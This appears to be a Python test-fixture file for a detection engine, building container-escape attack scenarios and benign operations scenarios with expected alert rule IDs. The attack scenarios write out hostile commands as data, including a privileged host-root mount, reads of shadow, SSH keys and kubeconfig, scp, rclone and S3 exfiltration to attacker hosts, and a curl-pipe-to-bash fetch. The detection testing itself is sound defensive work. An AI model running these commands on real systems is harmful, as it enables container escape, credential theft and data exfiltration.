from __future__ import annotations
import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _proc_evt(
    ts,
    cmdline,
    *,
    host="container-host",
    user="root",
    process=None,
    source="journald",
    action="process_exec",
    outcome="success",
    fields=None,
    distro_family="unknown",
):
    merged_fields = {"cmdline": cmdline}
    if fields:
        merged_fields.update(fields)
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action=action,
        outcome=outcome,
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields=merged_fields,
        distro_family=distro_family,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="docker-exec-then-host-archive",
            events=[
                _proc_evt(now + 1, "docker exec -it webapp sh", host="container-attack-01", process="docker"),
                _proc_evt(now + 16, "tar czf /tmp/host.tgz /host/etc /host/root/.ssh", host="container-attack-01", process="tar"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-053"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="docker-exec-then-secret-read",
            events=[
                _proc_evt(now + 2, "docker exec -it webapp sh", host="container-attack-02", process="docker"),
                _proc_evt(now + 12, "cat /host/root/.ssh/id_rsa", host="container-attack-02", process="cat"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="privileged-container-then-scp",
            events=[
                _proc_evt(now + 3, "docker run --privileged -v /:/host alpine sh", host="container-attack-03", process="docker"),
                _proc_evt(now + 13, "scp /tmp/loot.tgz attacker@198.51.100.94:/tmp/loot.tgz", host="container-attack-03", process="scp"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="kubectl-exec-then-kubeconfig-read",
            events=[
                _proc_evt(now + 4, "kubectl exec app-pod -- /bin/sh", host="container-attack-04", process="kubectl"),
                _proc_evt(now + 14, "cat /etc/kubernetes/admin.conf", host="container-attack-04", process="cat"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="docker-cp-then-rclone",
            events=[
                _proc_evt(now + 5, "docker cp webapp:/etc/nginx/nginx.conf /tmp/nginx.conf", host="container-attack-05", process="docker"),
                _proc_evt(now + 15, "rclone copy /tmp/nginx.conf remote:loot", host="container-attack-05", process="rclone"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="host-mount-path-then-aws-s3",
            events=[
                _proc_evt(now + 6, "docker exec -it db sh", host="container-attack-06", process="docker"),
                _proc_evt(now + 16, "aws s3 cp /host/etc/shadow s3://attacker-bucket/shadow", host="container-attack-06", process="aws"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="docker-start-host-mounted-then-wget",
            events=[
                _proc_evt(now + 7, "docker start host-mounted-agent", host="container-attack-07", process="docker", fields={"cmdline": "docker start host-mounted-agent -v /:/host"}),
                _proc_evt(now + 17, "wget http://198.51.100.40/loot -O /tmp/loot.bin", host="container-attack-07", process="wget"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="crictl-exec-then-env-read",
            events=[
                _proc_evt(now + 8, "crictl exec -it pod123 sh", host="container-attack-08", process="crictl"),
                _proc_evt(now + 18, "cat /host/home/app/.env", host="container-attack-08", process="cat"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="ctr-exec-then-systemd-persistence",
            events=[
                _proc_evt(now + 9, "ctr task exec --exec-id 7 webapp sh", host="container-attack-09", process="ctr"),
                _proc_evt(now + 19, "cp backdoor.service /etc/systemd/system/backdoor.service", host="container-attack-09", process="cp"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-053"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="kubectl-exec-then-authorized-keys",
            events=[
                _proc_evt(now + 10, "kubectl exec prod-web -- /bin/bash", host="container-attack-10", process="kubectl"),
                _proc_evt(now + 20, "tee /etc/systemd/system/agent.service", host="container-attack-10", process="tee"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-053"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="privileged-start-then-curl-pipe",
            events=[
                _proc_evt(now + 11, "docker run --privileged --mount type=bind,src=/,dst=/host alpine sh", host="container-attack-11", process="docker"),
                _proc_evt(now + 21, "curl http://evil/p.sh | bash", host="container-attack-11", process="bash"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-podman-exec-then-secret-read",
            events=[
                _proc_evt(now + 12.1, "podman exec -it webapp sh", host="container-attack-13", user="root", process="podman", source="auditd", distro_family="rhel"),
                _proc_evt(now + 17.1, "cat /host/etc/shadow", host="container-attack-13", user="root", process="cat", source="auditd", distro_family="rhel"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-podman-run-then-curl-pipe",
            events=[
                _proc_evt(now + 12.2, "podman run --privileged -v /:/host registry.suse.com/bci/bci-base sh", host="container-attack-14", user="root", process="podman", source="syslog", distro_family="suse"),
                _proc_evt(now + 17.2, "curl http://198.51.100.71/p.sh | bash", host="container-attack-14", user="root", process="bash", source="syslog", distro_family="suse"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="hostpath-then-secret-and-scp",
            events=[
                _proc_evt(now + 12, "docker run --privileged -v /:/host alpine sh", host="container-attack-12", process="docker"),
                _proc_evt(now + 17, "cat /host/etc/kubernetes/admin.conf", host="container-attack-12", process="cat"),
                _proc_evt(now + 22, "scp /tmp/loot.tgz attacker@198.51.100.50:/tmp/loot.tgz", host="container-attack-12", process="scp"),
            ],
            expected_ids={"PROC-CONT-001", "SEQ-059"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="kube-system-healthcheck",
            events=[
                _proc_evt(now + 101, "kubectl exec -n kube-system metrics-server -- /bin/true", host="container-benign-01", process="kubectl"),
                _proc_evt(now + 111, "curl -fsS http://127.0.0.1/healthz", host="container-benign-01", process="curl"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="container-backup-sync",
            events=[
                _proc_evt(now + 102, "docker exec -it backup-agent sh", host="container-benign-02", process="docker"),
                _proc_evt(now + 112, "rsync /var/backups/node03.tgz backup@198.51.100.80:/srv/backup/", host="container-benign-02", process="rsync"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="routine-container-inspection",
            events=[
                _proc_evt(now + 103, "docker inspect webapp", host="container-benign-03", process="docker"),
                _proc_evt(now + 113, "docker ps", host="container-benign-03", process="docker"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="kubectl-logs-rollout",
            events=[
                _proc_evt(now + 104, "kubectl logs deploy/webapp", host="container-benign-04", process="kubectl"),
                _proc_evt(now + 114, "kubectl rollout status deploy/webapp", host="container-benign-04", process="kubectl"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="docker-pull-image",
            events=[
                _proc_evt(now + 105, "docker pull nginx:latest", host="container-benign-05", process="docker"),
                _proc_evt(now + 115, "docker image pull redis:latest", host="container-benign-05", process="docker"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="kube-system-printenv",
            events=[
                _proc_evt(now + 106, "kubectl exec -n kube-system coredns -- printenv", host="container-benign-06", process="kubectl"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="docker-start-kube-proxy",
            events=[
                _proc_evt(now + 107, "docker start kube-proxy", host="container-benign-07", process="docker"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="docker-start-pause",
            events=[
                _proc_evt(now + 108, "docker start pause", host="container-benign-08", process="docker"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="orchestration-ansible-maintenance",
            events=[
                _proc_evt(now + 109, "docker exec -it webapp sh", host="container-benign-09", process="docker"),
                _proc_evt(now + 119, "ansible-playbook rollout.yml", host="container-benign-09", process="ansible-playbook"),
            ],
            expected_ids=set(),
            forbidden_ids={"SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-podman-pull-inspect",
            events=[
                _proc_evt(now + 110.1, "podman pull registry.access.redhat.com/ubi9/ubi:latest", host="container-benign-11", user="root", process="podman", source="auditd", distro_family="rhel"),
                _proc_evt(now + 120.1, "podman inspect ubi9", host="container-benign-11", user="root", process="podman", source="auditd", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-podman-ps",
            events=[
                _proc_evt(now + 110.2, "podman ps", host="container-benign-12", user="root", process="podman", source="syslog", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
        CoverageScenario(
            name="docker-healthcheck-token",
            events=[
                _proc_evt(now + 110, "docker exec -it webapp healthcheck", host="container-benign-10", process="docker"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-CONT-001", "SEQ-053", "SEQ-059"},
            kind="benign",
        ),
    ]
